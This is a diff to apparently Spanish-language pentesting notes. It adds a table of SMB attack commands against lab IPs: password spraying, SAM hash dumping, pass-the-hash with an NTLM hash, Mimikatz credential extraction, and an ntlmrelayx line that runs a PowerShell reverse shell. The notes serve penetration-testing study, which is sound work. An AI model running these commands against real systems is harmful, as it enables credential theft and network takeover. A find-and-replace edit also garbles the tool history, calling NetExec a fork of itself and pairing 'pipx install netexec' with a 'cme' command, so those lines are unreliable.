@@ -270,7 +270,7 @@ smbmap -H 10.10.10.5 -u user -p 'Password123' -r 'share_folder' --upload localfi
 ---
 
 # NetExec (nxc),
-Es el fork y sucesor de CrackMapExec (CME).
+Es el fork y sucesor de netexec (CME).
 
 * Se usa en pentesting de Active Directory para interactuar con servicios SMB, WinRM, LDAP, MSSQL, RDP, etc.
 
@@ -855,6 +855,30 @@ certipy-ad find -u 'svcapp1' -p 'Hola1234$' -dc-ip 10.0.2.6 -vulnerable -stdout
 
 ---
 
+# Attacking SMB
+
+| Comando | Descripción |
+|---|---|
+| `smbclient -N -L //10.129.14.128` | Prueba de sesión nula contra el servicio SMB. |
+| `smbmap -H 10.129.14.128` | Enumeración de recursos compartidos en la red usando smbmap. |
+| `smbmap -H 10.129.14.128 -r notes` | Enumeración recursiva del recurso compartido "notes" con smbmap. |
+| `smbmap -H 10.129.14.128 --download "notes\note.txt"` | Descargar un archivo específico desde la carpeta compartida. |
+| `smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"` | Subir un archivo específico a la carpeta compartida. |
+| `rpcclient -U'%' 10.10.110.17` | Sesión nula con rpcclient. |
+| `./enum4linux-ng.py 10.10.11.45 -A -C` | Enumeración automatizada del servicio SMB usando enum4linux-ng. |
+| `netexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!'` | Ataque de password spraying contra varios usuarios de una lista. |
+| `impacket-psexec administrator:'Password123!'@10.10.110.17` | Conexión al servicio SMB usando impacket-psexec. |
+| `netexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec` | Ejecutar un comando en el servicio SMB usando netexec. |
+| `netexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users` | Enumerar usuarios actualmente conectados. |
+| `netexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam` | Extraer hashes de la base de datos SAM. |
+| `netexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE` | Autenticarse en el host objetivo usando la técnica Pass-The-Hash. |
+| `impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146` | Volcar la base de datos SAM usando impacket-ntlmrelayx. |
+| `impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <base64 reverse shell>'` | Ejecutar un reverse shell en PowerShell a través de impacket-ntlmrelayx. |
+
+
+
+---
+
 # 🛡️ Ataques a Active Directory (AD) - Cuentas de Servicio
 
 | Ataque                       | Desde dónde se ejecuta                  | Herramienta(s) & Descripción                                                                                   | Objetivo / Qué roba                                           |
@@ -888,7 +912,7 @@ certipy-ad find -u 'svcapp1' -p 'Hola1234$' -dc-ip 10.0.2.6 -vulnerable -stdout
 | **Mimikatz** | Extrae credenciales en texto plano, hashes y tickets Kerberos desde memoria. | Post-explotación / extracción de credenciales | Windows | Descargar desde GitHub o binarios precompilados. | `mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"` | Usuario con privilegio `SeDebugPrivilege` (normalmente admin local). |
 | **Impacket** | Conjunto de scripts Python para interactuar con protocolos de red (SMB, RDP, etc.). | Post-explotación / movimiento lateral | Linux | `pip install impacket` | `psexec.py usuario@victima` | Credenciales válidas y acceso a puertos necesarios. |
 | **Kerbrute** | Fuerza bruta o enumera usuarios en Kerberos. | Reconocimiento | Windows/Linux | Descargar desde GitHub (Go) o binario precompilado. | `kerbrute userenum -d dominio.local users.txt` | No requiere privilegios especiales; solo acceso a KDC (puerto 88). |
-| **CrackMapExec (CME)** | Automatiza pruebas en redes Windows (SMB, WinRM, RDP). | Post-explotación / movimiento lateral | Linux | `pipx install crackmapexec` | `cme smb 192.168.1.0/24 -u usuario -p contraseña` | Credenciales válidas. |
+| **netexec (CME)** | Automatiza pruebas en redes Windows (SMB, WinRM, RDP). | Post-explotación / movimiento lateral | Linux | `pipx install netexec` | `cme smb 192.168.1.0/24 -u usuario -p contraseña` | Credenciales válidas. |
 | **smbclient** | Cliente SMB para acceder a recursos compartidos. | Acceso a compartidos SMB | Linux | `sudo apt install smbclient` | `smbclient //192.168.1.10/compartido -U usuario` | Credenciales válidas o acceso anónimo. |
 | **rpcclient** | Cliente RPC para consultar información de Windows. | Enumeración | Linux | `sudo apt install samba-common-bin` | `rpcclient -U "" -N 192.168.1.10` | Acceso anónimo o credenciales válidas. |
 | **proxychains** | Encadena conexiones a través de proxies/Tor. | Pivoting / tunneling | Linux | `sudo apt install proxychains` | `proxychains nmap -Pn 10.10.10.10` | No requiere privilegios especiales. |
